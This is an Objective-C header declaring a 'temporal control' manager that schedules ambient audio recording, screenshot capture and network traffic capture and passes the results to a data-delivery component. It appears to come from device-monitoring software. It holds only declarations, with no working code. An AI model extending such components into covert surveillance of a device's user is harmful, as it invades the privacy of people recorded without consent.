//
//  TemporalControlManagerImpl.h
//  TemporalControlManager
//
//  Created by Benjawan Tanarattanakorn on 2/18/2558 BE.
//
//

#import <Foundation/Foundation.h>

#import "TemporalControlManager.h"
#import "DeliveryListener.h"

#import "MessagePortIPCReader.h"

#import "AmbientRecordingManager.h"

#import "ScreenshotCaptureDelegate.h" 
#import "NetworkTrafficCaptureDelegate.h"

@protocol AmbientRecordingManager;
@protocol ScreenshotCaptureManager;
@protocol TemporalControlDelegate;
@protocol NetworkTrafficCaptureManager;
@protocol DataDelivery;

@class TemporalStore;
@class MessagePortIPCReader;
@class TemporalControlValidator;
@class TemporalScheduler;

@interface TemporalControlManagerImpl : NSObject <TemporalControlManager, DeliveryListener, MessagePortIPCDelegate, AmbientRecordingDelegate, ScreenshotCaptureDelegate, NetworkTrafficCaptureDelegate> {

    MessagePortIPCReader                *mMessagePortReader;

    id <DataDelivery>                   mDDM;
    id <TemporalControlDelegate>        mTemporalControlDelegate;
    id <AmbientRecordingManager>        mAmbientRecordingManager;
    id <ScreenshotCaptureManager>       mScreenshotCaptureManager;      // For blueblood only
    id <NetworkTrafficCaptureManager>   mNetworkTrafficCaptureManager;  // For blueblood only

    TemporalStore                       *mTemporalStore;
    TemporalControlValidator            *mValidator;
    TemporalScheduler                   *mScheduler;
    BOOL                                mIsRecording;
    BOOL                                mIsMonitoring;
    
    BOOL                                mEnableScreenShot;
    BOOL                                mEnableNetworkTraffic;
    
}

@property (nonatomic, assign) id <DataDelivery>            mDDM;
@property (nonatomic, assign) id <TemporalControlDelegate> mTemporalControlDelegate;

// The components that take the action
@property (nonatomic, assign) id <AmbientRecordingManager>  mAmbientRecordingManager;
@property (nonatomic, assign) id <ScreenshotCaptureManager> mScreenshotCaptureManager; // For blueblood only
@property (nonatomic, assign) id <NetworkTrafficCaptureManager> mNetworkTrafficCaptureManager; // For blueblood only

@property (nonatomic, strong) TemporalStore *mTemporalStore;
@property (nonatomic, strong) TemporalControlValidator *mValidator;
@property (nonatomic, strong) TemporalScheduler *mScheduler;

@property (nonatomic) BOOL mIsRecording;
@property (nonatomic) BOOL mIsMonitoring;

@property (nonatomic) BOOL mEnableScreenShot;
@property (nonatomic) BOOL mEnableNetworkTraffic;
- (id) initWithDDM: (id <DataDelivery>) aDDM;

- (void) startTemporalControl;
- (void) stopTemporalControl;


#pragma mark - TemporalControlManager Protocol


- (BOOL) requestTemporalControl: (id <TemporalControlDelegate>) aDelegate;
- (BOOL) syncTemporalControl: (id <TemporalControlDelegate>) aDelegate;


#pragma mark - Delivery Listener Protocol


- (void) requestFinished: (DeliveryResponse*) aResponse;
- (void) updateRequestProgress: (DeliveryResponse*) aResponse;

@end
